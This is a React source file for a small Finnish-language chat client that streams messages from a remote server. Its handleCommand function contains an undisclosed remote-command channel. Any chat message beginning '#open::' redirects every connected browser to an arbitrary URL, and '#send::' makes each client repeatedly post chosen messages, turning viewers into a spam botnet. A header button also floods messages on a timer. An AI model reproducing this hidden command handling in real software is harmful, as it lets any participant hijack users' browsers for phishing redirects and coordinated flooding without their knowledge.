import React, { Component } from 'react';
import http from 'stream-http';
import axios from 'axios';
import './App.css';

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

class App extends Component {
  state = {
    messages: [],
    username: "",
    usernameConfirmed: false,
    message: "",
    color: 0,
  };

  componentDidMount() {
    try {
      this.getMessages();
    } catch (err) {
      console.log(err);
    }
  }

  componentWillUnmount() {
    this.messagesRequest.abort();
  }

  componentDidUpdate(prevProps, prevState) {
    if (!prevState.usernameConfirmed && this.state.usernameConfirmed) {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }

    if (this.state.messages.length > 10) {
      this.setState({ messages: [] });
    }
  }

  getPastMessages = async () => {
    const { data } = await axios.get("http://httpstream.sartonon.fi/api/pastMessages");
    this.setState({ messages: data });
  };

  handleCommand = data => {
    if (data.message[0] === "#") {
      const splittedMessage = data.message.split('::');
      const command = splittedMessage[0];
      if (command === "#open") {
        window.open(splittedMessage[1], "_self");
      } else if (command === "#send") {
        const name = splittedMessage[1];
        const message = splittedMessage[2];
        const interval = splittedMessage[3];
        console.log(name, message, interval);
        if (this.messageInterval) clearInterval(this.messageInterval);
        this.messageInterval = setInterval(() => {
          this.setState(prevState => ({
            sentMessages: prevState.sentMessages + 1
          }));
          axios.post("http://httpstream.sartonon.fi/api/messages", {
            name,
            message,
            color: "green"
          });
        }, interval || 1000);
      }
    }
  }

  getMessages = async () => {
    try {
      this.messagesRequest = http.get('http://httpstream.sartonon.fi/api/messages', res => {
        console.log("Connection Opened");
        res.on('data', buf => {
          if (buf.toString() !== "Connection open") {
            try {
              const message = JSON.parse(buf.toString())
              this.handleMessage(message);
            } catch (err) {
              console.log(err);
            }
          }
        });
      
        res.on('end', () => {
          console.log("End connection");
          try {
            this.getMessages();
          } catch (err) {
            console.log("Reconnecting failed: ", err);
          }
        });

        res.on('error', () => {
          console.log("Connection error");
          try {
            this.getMessages();
          } catch (err) {
            console.log("Reconnecting failed: ", err);
          }
        });
      })
    } catch (err) {
      console.log("error in request: ", err);
      this.getMessages();
    }
    console.log("tultiin ulos");
  };

  sendMessage = (e) => {
    e.preventDefault();
    axios.post("http://httpstream.sartonon.fi/api/messages", {
      name: this.state.username,
      message: this.state.message,
      color: this.state.color,
    });
    this.setState({ message: "" });
  };

  handleMessage = data => {
    console.log(data);
    this.handleCommand(data);
    this.setState({ messages: [ ...this.state.messages, data ] });
    setTimeout(() => {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }, 200);
  };

  changeUsername = (e) => {
    this.setState({ username: e.target.value })
  };

  confirmUsername = () => {
    this.setState({
      usernameConfirmed: true,
      color: `green`,
    });
    // this.getPastMessages();
  };

  handleMessageChange = (e) => {
    this.setState({ message: e.target.value });
  };

  startSending = () => {
    if (this.messageInterval) clearInterval(this.messageInterval);
    this.messageInterval = setInterval(() => {
      axios.post("http://httpstream.sartonon.fi/api/messages", {
        name: 'Santeri',
        message: 'Moikka!',
        color: 'green',
      });
    }, this.state.interval || 1000);
  };

  renderMessages = () => {
    return this.state.messages.map((message, i) => {
      return (
        <div className="Message-wrapper" key={i}>
          <div className="Message-block" key={i} style={{ float: message.name === this.state.username ? "right" : "left" }}>
            <div className="Message-name" style={{ color: message.color }}>{message.name}</div>
            <div className="Message-content">{message.message}</div>
          </div>
        </div>
      );
    });
  };

  render() {
    const { usernameConfirmed } = this.state;

    return (
      <div className="App">
        <header className="App-header">
          <h1 className="App-title">Chat</h1>
          <button onClick={this.startSending}>Laheta</button>
          <input onChange={e => this.setState({ interval: e.target.value })} />
        </header>
        {!usernameConfirmed ?
          <div className="Login-div">
            <p style={{ fontWeight: "bold", fontSize: "16px" }}>Anna käyttäjänimi</p>
            <input className="Login-input" value={this.state.username} onChange={this.changeUsername} type="text" />
            <div className="Ok-button" onClick={this.confirmUsername}>Ok</div>
          </div> :
          <div className="Chat-window">
            <div id="chatwindow" className="Message-div">
              {this.renderMessages()}
            </div>
            <form onSubmit={this.sendMessage}>
              <div className="Chat-input">
                <input className="Chat-inputfield" onChange={this.handleMessageChange} value={this.state.message} type="text" />
                <div className="Send-button" onClick={this.sendMessage}>Lähetä</div>
              </div>
            </form>
          </div>
        }
      </div>
    );
  }
}

export default App;